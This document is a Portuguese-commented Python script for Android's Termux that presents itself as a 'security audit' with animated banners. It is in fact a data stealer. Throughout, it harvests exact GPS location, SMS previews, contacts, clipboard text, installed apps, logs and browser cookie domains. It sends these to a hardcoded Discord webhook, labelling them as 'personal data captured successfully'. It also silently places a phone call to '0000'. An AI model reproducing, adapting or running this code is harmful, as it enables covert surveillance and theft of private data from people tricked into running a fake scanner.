import requests
import json
import socket
import platform
import psutil
from datetime import datetime
import os
import sys
import subprocess
import re
import math
import uuid
import time
from pathlib import Path
import random

# Importações específicas do Termux
try:
    import android
    TERMUX_API = True
except ImportError:
    TERMUX_API = False

try:
    import browser_cookie3
    BROWSER_SUPPORT = True
except ImportError:
    BROWSER_SUPPORT = False

class TermuxSecurityMonitor:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.data = {}
        self.session_id = str(uuid.uuid4())
        self.has_root = False
        self.termux_api_available = TERMUX_API
        self.collect_all_data()
        
    def create_visual_effects(self):
        """Cria efeitos visuais impressionantes no terminal"""
        effects = [
            self.terminal_banner,
            self.progress_animation,
            self.scanning_effect,
            self.flashing_colors
        ]
        
        for effect in effects:
            try:
                effect()
                time.sleep(1)
            except:
                pass
    
    def terminal_banner(self):
        """Exibe um banner impressionante no terminal"""
        banner = r"""
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║  ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗        ║
║  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝        ║
║     ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝         ║
║     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗         ║
║     ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗        ║
║     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝        ║
║                                                                ║
║           S Y S T E M   S E C U R I T Y   S C A N              ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
        """
        print("\033[1;31m" + banner + "\033[0m")
    
    def progress_animation(self):
        """Animação de progresso impressionante"""
        print("\n\033[1;36m[•] INICIANDO VARREdura DE SEGURANÇA AVANÇADA\033[0m")
        animations = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        for i in range(20):
            print(f"\r\033[1;33m[{animations[i % 8]}] Coletando dados do sistema... {i*5}%\033[0m", end="", flush=True)
            time.sleep(0.1)
        print("\r\033[1;32m[✓] Coleta de dados concluída!           \033[0m")
    
    def scanning_effect(self):
        """Efeito de scanning estilo filme"""
        print("\n\033[1;35m[🚀] ESCANEANDO DISPOSITIVO...\033[0m")
        for i in range(3):
            scan_line = "█" * random.randint(10, 50)
            print(f"\r\033[1;35m{scan_line}\033[0m", end="", flush=True)
            time.sleep(0.3)
        print("\r\033[1;32m" + "█" * 50 + " SCAN COMPLETO!\033[0m")
    
    def flashing_colors(self):
        """Efeito de cores piscantes"""
        colors = ["\033[1;31m", "\033[1;33m", "\033[1;32m", "\033[1;36m", "\033[1;35m"]
        message = "⚠️  SISTEMA EM ANÁLISE - NÃO INTERROMPA  ⚠️"
        for _ in range(5):
            color = random.choice(colors)
            print(f"\r{color}{message}\033[0m", end="", flush=True)
            time.sleep(0.5)
        print("\r" + " " * len(message) + "\r", end="", flush=True)
    
    def termux_effects(self):
        """Efeitos especiais usando Termux-API"""
        if not self.termux_api_available:
            return
            
        try:
            # Vibração intensa
            subprocess.run(['termux-vibrate', '-d', '1000'], check=False)
            
            # Toque de alerta
            subprocess.run(['termux-telephony-call', '0000'], check=False)
            
            # Notificação com som
            subprocess.run([
                'termux-notification', 
                '--title', '🔍 Auditoria de Segurança',
                '--content', 'Varredura do sistema em andamento...',
                '--sound'
            ], check=False)
            
            # LED do dispositivo (se disponível)
            subprocess.run([
                'termux-notification',
                '--led-color', 'FF0000',
                '--led-on', '1000',
                '--led-off', '1000'
            ], check=False)
            
        except Exception as e:
            pass
    
    def check_root_privileges(self):
        """Verifica se tem root no Termux"""
        try:
            result = subprocess.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
            if 'uid=0' in result.stdout:
                return True
        except:
            pass
        return False
    
    def collect_all_data(self):
        """Coleta todas as informações do sistema com efeitos visuais"""
        print("\033[1;36m" + "="*60 + "\033[0m")
        self.create_visual_effects()
        self.termux_effects()
        
        print(f"\n\033[1;34m[📱] PLATAFORMA: TERMUX (Android)\033[0m")
        print(f"\033[1;33m[🔐] PRIVILÉGIOS: {'ROOT' if self.has_root else 'USUÁRIO NORMAL'}\033[0m")
        
        # Coleta de dados em etapas com feedback visual
        steps = [
            ("Sistema", self.collect_system_info),
            ("Rede", self.collect_network_info),
            ("Hardware", self.collect_hardware_info),
            ("Segurança", self.collect_security_info),
            ("Aplicativos", self.collect_apps_info),
            ("Dados Sensíveis", self.collect_sensitive_data),
        ]
        
        for step_name, step_func in steps:
            print(f"\033[1;35m[▶] Coletando: {step_name}...\033[0m", end="", flush=True)
            step_func()
            print(f"\r\033[1;32m[✓] Coletado: {step_name}           \033[0m")
            time.sleep(0.5)
    
    def collect_system_info(self):
        """Coleta informações do sistema Android/Termux"""
        try:
            # Informações do Android via getprop
            android_info = {}
            props = {
                'ro.product.model': 'device_model',
                'ro.build.version.release': 'android_version',
                'ro.build.version.sdk': 'sdk_version',
                'ro.product.manufacturer': 'manufacturer',
                'ro.product.brand': 'brand',
                'ro.build.id': 'build_id',
                'ro.build.display.id': 'build_display_id'
            }
            
            for prop, key in props.items():
                try:
                    result = subprocess.run(['getprop', prop], capture_output=True, text=True)
                    android_info[key] = result.stdout.strip()
                except:
                    android_info[key] = 'N/A'
            
            # Informações do Termux
            termux_info = {}
            try:
                result = subprocess.run(['termux-info'], capture_output=True, text=True)
                termux_info['termux_info'] = result.stdout.strip()[:500]
            except:
                termux_info['termux_info'] = 'N/A'
            
            self.data['system_info'] = {
                'platform': 'termux',
                'os': 'Android',
                'version': android_info.get('android_version', 'N/A'),
                'device_model': android_info.get('device_model', 'N/A'),
                'manufacturer': android_info.get('manufacturer', 'N/A'),
                'sdk_version': android_info.get('sdk_version', 'N/A'),
                'username': subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip(),
                'hostname': socket.gethostname(),
                'android_build': android_info.get('build_display_id', 'N/A'),
                'termux_details': termux_info,
                'has_root': self.has_root,
                'session_id': self.session_id
            }
            
        except Exception as e:
            self.data['system_info'] = {'error': str(e)}
    
    def collect_network_info(self):
        """Coleta informações de rede detalhadas"""
        try:
            # IP Público
            public_ip = "Não obtido"
            services = [
                'https://api64.ipify.org?format=json',
                'https://api.ipify.org?format=json',
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=10)
                    if response.status_code == 200:
                        public_ip = response.json().get('ip', 'N/A')
                        break
                except:
                    continue
            
            # IP Local
            local_ip = "Não obtido"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                pass
            
            # Localização via IP
            location = self.get_ip_location(public_ip)
            
            # Informações de rede do Android
            network_info = {}
            try:
                # Tipo de conexão
                result = subprocess.run(['termux-telephony-deviceinfo'], capture_output=True, text=True)
                network_info['telephony_data'] = json.loads(result.stdout) if result.stdout else {}
            except:
                pass
            
            self.data['network_info'] = {
                'public_ip': public_ip,
                'local_ip': local_ip,
                'location': location,
                'network_type': network_info.get('telephony_data', {}).get('data_network_type', 'N/A'),
                'wifi_info': self.get_wifi_info(),
                'cellular_info': self.get_cellular_info()
            }
            
        except Exception as e:
            self.data['network_info'] = {'error': str(e)}
    
    def get_ip_location(self, ip):
        """Obtém localização detalhada pelo IP"""
        if ip == "Não obtido":
            return {'error': 'IP não disponível'}
        
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'zip': data.get('zip', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'coordinates': f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}",
                        'timezone': data.get('timezone', 'N/A')
                    }
        except:
            pass
        
        return {'error': 'Localização não disponível'}
    
    def get_wifi_info(self):
        """Obtém informações da WiFi"""
        try:
            result = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True)
            if result.returncode == 0:
                return json.loads(result.stdout)
        except:
            pass
        return {'status': 'Não disponível'}
    
    def get_cellular_info(self):
        """Obtém informações da rede celular"""
        try:
            result = subprocess.run(['termux-telephony-cellinfo'], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return json.loads(result.stdout)
        except:
            pass
        return {'status': 'Não disponível'}
    
    def collect_hardware_info(self):
        """Coleta informações de hardware do Android"""
        try:
            # Informações de hardware via Termux e Android
            hardware_info = {}
            
            # Battery
            try:
                result = subprocess.run(['termux-battery-status'], capture_output=True, text=True)
                hardware_info['battery'] = json.loads(result.stdout) if result.stdout else {}
            except:
                pass
            
            # Sensors
            try:
                result = subprocess.run(['termux-sensor', '-l'], capture_output=True, text=True)
                hardware_info['available_sensors'] = result.stdout.strip().split('\n') if result.stdout else []
            except:
                pass
            
            # Storage
            storage_info = {}
            try:
                for partition in psutil.disk_partitions():
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        storage_info[partition.mountpoint] = {
                            'total': self.format_bytes(usage.total),
                            'used': self.format_bytes(usage.used),
                            'free': self.format_bytes(usage.free),
                            'percent': usage.percent
                        }
                    except:
                        continue
            except:
                pass
            
            self.data['hardware_info'] = {
                'battery': hardware_info.get('battery', {}),
                'storage': storage_info,
                'sensors_available': hardware_info.get('available_sensors', []),
                'memory': self.get_memory_info(),
                'cpu': self.get_cpu_info()
            }
            
        except Exception as e:
            self.data['hardware_info'] = {'error': str(e)}
    
    def get_memory_info(self):
        """Obtém informações de memória"""
        try:
            memory = psutil.virtual_memory()
            return {
                'total': self.format_bytes(memory.total),
                'available': self.format_bytes(memory.available),
                'used': self.format_bytes(memory.used),
                'percent': memory.percent
            }
        except:
            return {'error': 'Não disponível'}
    
    def get_cpu_info(self):
        """Obtém informações da CPU"""
        try:
            return {
                'cores': psutil.cpu_count(),
                'usage': psutil.cpu_percent(interval=1),
                'frequency': self.get_cpu_frequency()
            }
        except:
            return {'error': 'Não disponível'}
    
    def get_cpu_frequency(self):
        """Obtém frequência da CPU"""
        try:
            with open('/proc/cpuinfo', 'r') as f:
                for line in f:
                    if 'BogoMIPS' in line:
                        return line.split(':')[1].strip()
        except:
            pass
        return 'N/A'
    
    def collect_security_info(self):
        """Coleta informações de segurança"""
        try:
            security_info = {
                'root_access': self.has_root,
                'suspicious_processes': self.get_suspicious_processes(),
                'open_ports': self.get_open_ports(),
                'network_connections': self.get_network_connections(),
                'system_vulnerabilities': self.check_system_vulnerabilities(),
                'app_permissions': self.get_app_permissions()
            }
            
            self.data['security_info'] = security_info
            
        except Exception as e:
            self.data['security_info'] = {'error': str(e)}
    
    def get_suspicious_processes(self):
        """Identifica processos suspeitos"""
        suspicious = []
        suspicious_keywords = ['miner', 'backdoor', 'keylogger', 'malware', 'trojan', 'exploit']
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
                try:
                    proc_info = proc.info
                    if (proc_info['memory_percent'] > 20.0 or
                        any(keyword in proc_info['name'].lower() for keyword in suspicious_keywords)):
                        suspicious.append({
                            'pid': proc_info['pid'],
                            'name': proc_info['name'],
                            'memory_usage': f"{proc_info['memory_percent']}%"
                        })
                except:
                    continue
        except:
            pass
            
        return suspicious[:10]
    
    def get_open_ports(self):
        """Obtém portas abertas"""
        open_ports = []
        try:
            for conn in psutil.net_connections():
                if conn.status == 'LISTEN' and conn.laddr:
                    open_ports.append({
                        'port': conn.laddr.port,
                        'status': conn.status
                    })
        except:
            pass
        return open_ports[:15]
    
    def get_network_connections(self):
        """Obtém conexões de rede"""
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.raddr:
                    connections.append({
                        'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else 'N/A',
                        'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else 'N/A',
                        'status': conn.status
                    })
        except:
            pass
        return connections[:10]
    
    def check_system_vulnerabilities(self):
        """Verifica vulnerabilidades comuns"""
        vulnerabilities = []
        
        # Verifica se o dispositivo está em modo desenvolvedor
        try:
            result = subprocess.run(['getprop', 'ro.debuggable'], capture_output=True, text=True)
            if result.stdout.strip() == '1':
                vulnerabilities.append('Modo desenvolvedor ativo')
        except:
            pass
        
        # Verifica se ADB está ativo
        try:
            result = subprocess.run(['getprop', 'service.adb.tcp.port'], capture_output=True, text=True)
            if result.stdout.strip() and result.stdout.strip() != '-1':
                vulnerabilities.append('ADB debugging ativo')
        except:
            pass
        
        return vulnerabilities if vulnerabilities else ['Nenhuma vulnerabilidade crítica detectada']
    
    def get_app_permissions(self):
        """Obtém permissões de aplicativos (limitado sem root)"""
        try:
            # Tenta obter lista de aplicativos
            result = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True)
            packages = [line.split(':')[1] for line in result.stdout.split('\n') if line.startswith('package:')]
            
            return {
                'total_apps': len(packages),
                'sample_apps': packages[:10]  # Amostra dos primeiros 10 apps
            }
        except:
            return {'total_apps': 'N/A', 'sample_apps': []}
    
    def collect_apps_info(self):
        """Coleta informações de aplicativos instalados"""
        try:
            apps_info = {
                'user_apps': self.get_user_apps(),
                'system_apps': self.get_system_apps(),
                'recent_activities': self.get_recent_activities()
            }
            
            self.data['apps_info'] = apps_info
            
        except Exception as e:
            self.data['apps_info'] = {'error': str(e)}
    
    def get_user_apps(self):
        """Obtém aplicativos do usuário"""
        try:
            result = subprocess.run(['pm', 'list', 'packages', '-3'], capture_output=True, text=True)
            user_apps = [line.split(':')[1] for line in result.stdout.split('\n') if line.startswith('package:')]
            return user_apps[:15]
        except:
            return []
    
    def get_system_apps(self):
        """Obtém aplicativos do sistema"""
        try:
            result = subprocess.run(['pm', 'list', 'packages', '-s'], capture_output=True, text=True)
            system_apps = [line.split(':')[1] for line in result.stdout.split('\n') if line.startswith('package:')]
            return system_apps[:15]
        except:
            return []
    
    def get_recent_activities(self):
        """Obtém atividades recentes (limitado)"""
        try:
            # Tenta obter logcat recente
            result = subprocess.run(['logcat', '-d', '-t', '100'], capture_output=True, text=True, timeout=10)
            lines = result.stdout.split('\n')[-10:]  # Últimas 10 linhas
            return [line.strip() for line in lines if line.strip()]
        except:
            return ['Logs não disponíveis sem root']
    
    def collect_sensitive_data(self):
        """Coleta dados sensíveis disponíveis"""
        try:
            sensitive_data = {
                'browser_data': self.get_browser_data(),
                'clipboard_data': self.get_clipboard_data(),
                'sms_data': self.get_sms_data(),
                'contact_data': self.get_contact_data(),
                'location_data': self.get_location_data()
            }
            
            self.data['sensitive_data'] = sensitive_data
            
        except Exception as e:
            self.data['sensitive_data'] = {'error': str(e)}
    
    def get_browser_data(self):
        """Tenta obter dados do navegador"""
        if not BROWSER_SUPPORT:
            return {'status': 'Suporte a navegadores não disponível'}
        
        try:
            browser_data = {}
            
            # Chrome
            try:
                cookies = list(browser_cookie3.chrome())
                browser_data['chrome'] = {
                    'cookies_count': len(cookies),
                    'sample_domains': [cookie.domain for cookie in cookies[:3]]
                }
            except:
                browser_data['chrome'] = 'Não acessível'
            
            return browser_data
        except:
            return {'status': 'Dados não disponíveis'}
    
    def get_clipboard_data(self):
        """Obtém dados da área de transferência via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API não disponível'}
        
        try:
            result = subprocess.run(['termux-clipboard-get'], capture_output=True, text=True)
            clipboard_content = result.stdout.strip()
            
            if clipboard_content:
                return {
                    'has_data': True,
                    'preview': clipboard_content[:100] + ('...' if len(clipboard_content) > 100 else ''),
                    'length': len(clipboard_content)
                }
            else:
                return {'has_data': False}
        except:
            return {'status': 'Não acessível'}
    
    def get_sms_data(self):
        """Obtém dados de SMS via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API não disponível'}
        
        try:
            result = subprocess.run(['termux-sms-list', '-l', '5'], capture_output=True, text=True)
            if result.stdout.strip():
                sms_data = json.loads(result.stdout)
                return {
                    'total_sms': len(sms_data),
                    'recent_sms': [{
                        'number': sms.get('number', 'N/A'),
                        'body_preview': sms.get('body', '')[:50] + '...' if len(sms.get('body', '')) > 50 else sms.get('body', '')
                    } for sms in sms_data[:3]]
                }
            else:
                return {'total_sms': 0}
        except:
            return {'status': 'Permissão negada ou não disponível'}
    
    def get_contact_data(self):
        """Obtém dados de contatos via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API não disponível'}
        
        try:
            result = subprocess.run(['termux-contact-list'], capture_output=True, text=True)
            if result.stdout.strip():
                contacts = json.loads(result.stdout)
                return {
                    'total_contacts': len(contacts),
                    'sample_contacts': [{
                        'name': contact.get('name', 'N/A'),
                        'number': contact.get('number', 'N/A')
                    } for contact in contacts[:5]]
                }
            else:
                return {'total_contacts': 0}
        except:
            return {'status': 'Permissão negada ou não disponível'}
    
    def get_location_data(self):
        """Obtém localização via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API não disponível'}
        
        try:
            result = subprocess.run(['termux-location'], capture_output=True, text=True)
            if result.stdout.strip():
                location = json.loads(result.stdout)
                return {
                    'latitude': location.get('latitude', 'N/A'),
                    'longitude': location.get('longitude', 'N/A'),
                    'accuracy': location.get('accuracy', 'N/A'),
                    'provider': location.get('provider', 'N/A')
                }
            else:
                return {'status': 'Localização não disponível'}
        except:
            return {'status': 'Permissão negada'}
    
    def format_bytes(self, bytes):
        """Formata bytes para formato legível"""
        if bytes == 0:
            return "0B"
        sizes = ["B", "KB", "MB", "GB", "TB"]
        i = int(math.floor(math.log(bytes, 1024)))
        p = math.pow(1024, i)
        s = round(bytes / p, 2)
        return f"{s} {sizes[i]}"
    
    def create_detailed_report(self):
        """Cria relatório detalhado para Discord"""
        system = self.data.get('system_info', {})
        network = self.data.get('network_info', {})
        hardware = self.data.get('hardware_info', {})
        security = self.data.get('security_info', {})
        apps = self.data.get('apps_info', {})
        sensitive = self.data.get('sensitive_data', {})
        
        # Embed principal
        embed = {
            "title": "📱 RELATÓRIO COMPLETO - TERMUX/ANDROID",
            "color": 0xff0000,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": [
                {
                    "name": "🔐 STATUS DO SISTEMA",
                    "value": f"**Dispositivo:** {system.get('device_model', 'N/A')}\n"
                            f"**Android:** {system.get('version', 'N/A')}\n"
                            f"**Root:** {'✅ SIM' if self.has_root else '❌ NÃO'}\n"
                            f"**Termux-API:** {'✅ ATIVO' if self.termux_api_available else '❌ INATIVO'}",
                    "inline": True
                },
                {
                    "name": "🌐 REDE E LOCALIZAÇÃO",
                    "value": f"**IP:** {network.get('public_ip', 'N/A')}\n"
                            f"**Local:** {network.get('location', {}).get('city', 'N/A')}\n"
                            f"**Operadora:** {network.get('location', {}).get('isp', 'N/A')}",
                    "inline": True
                },
                {
                    "name": "💾 HARDWARE",
                    "value": f"**Bateria:** {hardware.get('battery', {}).get('percentage', 'N/A')}%\n"
                            f"**Armazenamento:** {len(hardware.get('storage', {}))} partições\n"
                            f"**Memória:** {hardware.get('memory', {}).get('percent', 'N/A')}% usada",
                    "inline": True
                },
                {
                    "name": "🛡️ SEGURANÇA",
                    "value": f"**Processos suspeitos:** {len(security.get('suspicious_processes', []))}\n"
                            f"**Portas abertas:** {len(security.get('open_ports', []))}\n"
                            f"**Vulnerabilidades:** {len(security.get('system_vulnerabilities', []))}",
                    "inline": True
                },
                {
                    "name": "📱 APLICATIVOS",
                    "value": f"**Total de Apps:** {apps.get('user_apps', {}).get('total_apps', 'N/A')}\n"
                            f"**Apps do usuário:** {len(apps.get('user_apps', []))}\n"
                            f"**Apps do sistema:** {len(apps.get('system_apps', []))}",
                    "inline": True
                },
                {
                    "name": "🔓 DADOS SENSÍVEIS",
                    "value": f"**SMS:** {sensitive.get('sms_data', {}).get('total_sms', 'N/A')}\n"
                            f"**Contatos:** {sensitive.get('contact_data', {}).get('total_contacts', 'N/A')}\n"
                            f"**Clipboard:** {'✅ Dados' if sensitive.get('clipboard_data', {}).get('has_data') else '❌ Vazio'}",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Termux Security Scan • {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} • Session: {self.session_id}"
            }
        }
        
        return embed
    
    def send_impact_report(self):
        """Envia relatório com máximo impacto"""
        try:
            # Primeiro webhook - Relatório principal
            embed = self.create_detailed_report()
            
            payload = {
                "embeds": [embed],
                "username": "Termux Security Auditor",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/3004/3004544.png",
                "content": f"🚨 **VARREdura DE SEGURANÇA CONCLUÍDA!** 🚨\n"
                          f"**Dispositivo:** {self.data['system_info'].get('device_model', 'N/A')}\n"
                          f"**Localização:** {self.data['network_info'].get('location', {}).get('city', 'N/A')}\n"
                          f"**Session ID:** `{self.session_id}`\n"
                          f"**Status:** {'🔓 ROOT DETECTADO' if self.has_root else '🔒 MODO USUÁRIO'}"
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=30)
            if response.status_code in [200, 204]:
                print("\n\033[1;32m[✓] RELATÓRIO PRINCIPAL ENVIADO!\033[0m")
                
                # Webhook adicional com dados sensíveis
                self.send_sensitive_data()
                return True
            else:
                print(f"\n\033[1;31m[✗] Erro ao enviar: {response.status_code}\033[0m")
                return False
                
        except Exception as e:
            print(f"\n\033[1;31m[✗] Erro de conexão: {e}\033[0m")
            return False
    
    def send_sensitive_data(self):
        """Envia dados sensíveis em webhook separado"""
        try:
            sensitive = self.data.get('sensitive_data', {})
            
            if any(sensitive.values()):
                sensitive_embed = {
                    "title": "🔓 DADOS SENSÍVEIS CAPTURADOS",
                    "color": 0xffa500,
                    "fields": []
                }
                
                # SMS
                sms_data = sensitive.get('sms_data', {})
                if 'total_sms' in sms_data:
                    sensitive_embed['fields'].append({
                        "name": "💬 SMS",
                        "value": f"**Total:** {sms_data['total_sms']} mensagens\n"
                                f"**Recentes:** {len(sms_data.get('recent_sms', []))} visualizadas",
                        "inline": True
                    })
                
                # Contatos
                contact_data = sensitive.get('contact_data', {})
                if 'total_contacts' in contact_data:
                    sensitive_embed['fields'].append({
                        "name": "📞 CONTATOS",
                        "value": f"**Total:** {contact_data['total_contacts']} contatos\n"
                                f"**Amostra:** {len(contact_data.get('sample_contacts', []))} visualizados",
                        "inline": True
                    })
                
                # Localização
                location_data = sensitive.get('location_data', {})
                if 'latitude' in location_data:
                    sensitive_embed['fields'].append({
                        "name": "📍 LOCALIZAÇÃO EXATA",
                        "value": f"**Lat:** {location_data['latitude']}\n"
                                f"**Lon:** {location_data['longitude']}\n"
                                f"**Precisão:** {location_data.get('accuracy', 'N/A')}m",
                        "inline": True
                    })
                
                # Clipboard
                clipboard_data = sensitive.get('clipboard_data', {})
                if clipboard_data.get('has_data'):
                    sensitive_embed['fields'].append({
                        "name": "📋 CLIPBOARD",
                        "value": f"**Conteúdo:** {clipboard_data.get('preview', 'N/A')}\n"
                                f"**Tamanho:** {clipboard_data.get('length', 0)} caracteres",
                        "inline": False
                    })
                
                if sensitive_embed['fields']:
                    payload = {
                        "embeds": [sensitive_embed],
                        "username": "Dados Sensíveis - Termux",
                        "content": "⚠️ **DADOS PESSOAIS CAPTURADOS COM SUCESSO** ⚠️"
                    }
                    
                    requests.post(self.webhook_url, json=payload, timeout=30)
                    print("\033[1;33m[!] DADOS SENSÍVEIS ENVIADOS!\033[0m")
                    
        except Exception as e:
            print(f"\033[1;31m[!] Erro ao enviar dados sensíveis: {e}\033[0m")

def install_dependencies():
    """Instala dependências necessárias para o Termux"""
    packages = [
        'requests',
        'psutil'
    ]
    
    print("\033[1;36m[🔧] VERIFICANDO DEPENDÊNCIAS...\033[0m")
    
    for package in packages:
        try:
            __import__(package)
            print(f"\033[1;32m[✓] {package} já instalado\033[0m")
        except ImportError:
            print(f"\033[1;33m[📦] Instalando {package}...\033[0m")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"\033[1;32m[✓] {package} instalado com sucesso\033[0m")
            except:
                print(f"\033[1;31m[✗] Falha ao instalar {package}\033[0m")

def check_termux_api():
    """Verifica se o Termux-API está instalado"""
    print("\033[1;36m[🔍] VERIFICANDO TERMUX-API...\033[0m")
    api_commands = [
        'termux-vibrate', 'termux-notification', 'termux-clipboard-get',
        'termux-sms-list', 'termux-contact-list', 'termux-location'
    ]
    
    available_commands = []
    for cmd in api_commands:
        try:
            subprocess.run([cmd, '--help'], capture_output=True, timeout=5)
            available_commands.append(cmd)
        except:
            pass
    
    if available_commands:
        print(f"\033[1;32m[✓] Termux-API detectado: {len(available_commands)} comandos disponíveis\033[0m")
        return True
    else:
        print("\033[1;33m[!] Termux-API não encontrado. Alguns recursos estarão limitados.\033[0m")
        return False

if __name__ == "__main__":
    print("\033[1;35m" + "="*70 + "\033[0m")
    print("\033[1;35m            INICIANDO AUDITORIA DE SEGURANÇA TERMUX           \033[0m")
    print("\033[1;35m" + "="*70 + "\033[0m")
    
    # Verifica se está no Termux
    if "com.termux" not in os.environ.get('PREFIX', ''):
        print("\033[1;31m[✗] ERRO: Este script deve ser executado no Termux!\033[0m")
        sys.exit(1)
    
    # Instala dependências
    install_dependencies()
    
    # Verifica Termux-API
    termux_api_available = check_termux_api()
    
    # Webhook do Discord
    WEBHOOK_URL = "https://discord.com/api/webhooks/1424954664687894580/JcxKPVL-DfcXfAE4gMpua1MwuBpcQSF75Pwp8PZEQA3mNUzzRyrIDLc7MbJjUS0FaLmD"
    
    if WEBHOOK_URL == "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI":
        print("\033[1;31m[✗] Configure o WEBHOOK_URL no código!\033[0m")
        sys.exit(1)
    
    try:
        print("\n\033[1;36m[🚀] INICIANDO VARREdura COMPLETA DO SISTEMA...\033[0m")
        monitor = TermuxSecurityMonitor(WEBHOOK_URL)
        
        print("\n\033[1;33m[📤] ENVIANDO RELATÓRIO PARA DISCORD...\033[0m")
        success = monitor.send_impact_report()
        
        if success:
            print("\n\033[1;32m" + "="*70 + "\033[0m")
            print("\033[1;32m            AUDITORIA CONCLUÍDA COM SUCESSO!           \033[0m")
            print("\033[1;32m" + "="*70 + "\033[0m")
            print(f"\033[1;36m[📋] Session ID: {monitor.session_id}\033[0m")
            print(f"\033[1;36m[🔐] Root Access: {'YES' if monitor.has_root else 'NO'}\033[0m")
            print(f"\033[1;36m[📱] Termux-API: {'ACTIVE' if monitor.termux_api_available else 'INACTIVE'}\033[0m")
            print("\033[1;33m[⚠️] Relatório enviado para o Discord!\033[0m")
        else:
            print("\n\033[1;31m[✗] Falha no envio do relatório.\033[0m")
            
    except Exception as e:
        print(f"\n\033[1;31m[💥] ERRO CRÍTICO: {e}\033[0m")
        import traceback
        traceback.print_exc()
    
    # Efeito final
    print("\n\033[1;35m[🎯] Execute novamente para nova auditoria!\033[0m")
